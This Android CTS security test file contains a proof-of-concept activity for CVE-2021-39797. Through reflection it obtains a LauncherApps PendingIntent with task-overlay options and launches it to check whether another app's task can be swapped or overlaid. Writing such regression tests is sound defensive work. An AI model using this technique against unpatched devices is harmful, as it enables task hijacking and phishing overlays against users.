/*
 * Copyright (C) 2022 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2021_39797_test;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentSender.SendIntentException;
import android.content.SharedPreferences;
import android.content.pm.LauncherApps;
import android.os.Bundle;
import android.os.Process;
import android.os.UserHandle;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class PocActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences prefs =
                getSharedPreferences(getString(R.string.sharedPreferences), MODE_PRIVATE);
        if (prefs == null) {
            return;
        }
        int taskIdSaved = prefs.getInt(getString(R.string.taskId), -1);
        if (taskIdSaved == -1) {
            SharedPreferences.Editor editor = prefs.edit();
            editor.putInt(getString(R.string.taskId), getTaskId());
            editor.apply();
        } else {
            if ((taskIdSaved - 1) == getTaskId()) {
                SharedPreferences.Editor editor = prefs.edit();
                editor.putBoolean(getString(R.string.flagTaskSwapped), true);
                editor.apply();
            }
            setResult(prefs, getResources().getInteger(R.integer.noAssumptionFailure), "");
            return;
        }

        Method method;
        try {
            method = LauncherApps.class.getMethod(getString(R.string.targetFunction),
                    ComponentName.class, Bundle.class, UserHandle.class);
        } catch (NoSuchMethodException e) {
            setResult(prefs, getResources().getInteger(R.integer.assumptionFailure),
                    getString(R.string.noMethodExceptionMsg));
            return;
        }

        Bundle options = new Bundle();
        options.putBoolean(getString(R.string.attrTaskOverlay), true);
        options.putInt(getString(R.string.attrLaunchTaskId), getTaskId() - 1);

        PendingIntent pi;
        try {
            pi = (PendingIntent) method.invoke(getSystemService(LauncherApps.class),
                    getIntent().getComponent(), options,
                    UserHandle.getUserHandleForUid(Process.myUid()));
        } catch (IllegalAccessException | InvocationTargetException e) {
            setResult(prefs, getResources().getInteger(R.integer.assumptionFailure),
                    getString(R.string.invokeExceptionMsg));
            return;
        }
        if (pi == null) {
            setResult(prefs, getResources().getInteger(R.integer.assumptionFailure),
                    getString(R.string.errorNullCheckPIntent));
            return;
        }

        Bundle sendOptions = new Bundle();
        sendOptions.putInt(getString(R.string.attrPIntentLaunchFlags),
                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);

        try {
            startIntentSender(pi.getIntentSender(), null, 0, 0, 0, sendOptions);
        } catch (SendIntentException e) {
            setResult(prefs, getResources().getInteger(R.integer.assumptionFailure),
                    getString(R.string.startIntentSenderExceptionMsg));
            return;
        }
        setResult(prefs, getResources().getInteger(R.integer.noAssumptionFailure), "");
    }

    private void setResult(SharedPreferences sh, int result, String message) {
        if (sh != null) {
            SharedPreferences.Editor edit = sh.edit();
            edit.putInt(getString(R.string.resultKey), result);
            edit.putString(getString(R.string.messageKey), message);
            edit.commit();
        }
    }
}
